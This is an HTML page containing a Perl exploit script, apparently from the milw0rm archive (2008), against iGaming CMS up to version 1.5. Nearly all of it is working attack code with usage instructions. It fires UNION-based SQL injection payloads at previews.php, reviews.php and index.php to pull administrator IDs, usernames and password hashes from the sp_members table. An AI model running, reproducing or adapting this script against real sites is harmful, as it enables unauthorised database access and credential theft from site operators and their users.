<html><head><title>iGaming CMS <= 1.5 Multiple Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
# ----------------------------------------------------------
# iGaming &lt;= 1.5 Multiple Remote SQL Injection Exploit
# Perl Exploit - Output: id:admin:password
# Discovered On: 23/09/2008
# Discovered By: StAkeR - StAkeR[at]hotmail[dot]it
# Proud To Be Italian 
# ----------------------------------------------------------
# Usage: perl exploit.pl http://localhost/iGaming
# ----------------------------------------------------------

use strict;
use LWP::UserAgent;

my ($one,$two,$exec,$host,$http,$xxx,$view);

$view  = &quot;'%20union%20select%200,0,1,2,concat(0x25,id,0x3a,pseudo,0x3a,pass,0x25),0,6,7,8%20from%20sp_members%20WHERE%20id='1/*&quot;;
$exec  = &quot;'%20union%20select%201,concat(0x25,id,0x3a,pseudo,0x3a,pass,0x25),3%20from%20sp_members%20where%20id='1/*&quot;;
$host = shift @ARGV;
$http = new LWP::UserAgent or die $!;
$http-&gt;agent(&quot;Mozilla/4.5 [en] (Win95; U)&quot;);
$http-&gt;timeout(1);
                          

if($host !~ /^http:\/\/(.+?)$/)
{
  print &quot;[?] iGaming CMS &lt;= 1.5 Multiple Remote SQL Injection Exploit\n&quot;;
  print &quot;[?] Usage: perl $0 http://[path]\n&quot;;
  exit;
}
else
{
  $one = $http-&gt;get($host.'/previews.php?browse='.$exec);
  $two = $http-&gt;get($host.'/reviews.php?browse='.$exec);
  $xxx = $http-&gt;get($host.'/index.php?do=viewarticle&amp;id='.$view);
  
  if($one-&gt;is_success or $two-&gt;is_success or $xxx-&gt;is_success)
  {
    die &quot;$1\n&quot; if $one-&gt;content =~ /%(.+?)%/;
    die &quot;$1\n&quot; if $two-&gt;content =~ /%(.+?)%/;
    die &quot;$1\n&quot; if $xxx-&gt;content =~ /%(.+?)%/;
  }
  else
  {
    die &quot;[+] Exploit Failed!\n&quot;;
  }
}  

# milw0rm.com [2008-09-23]</pre></html>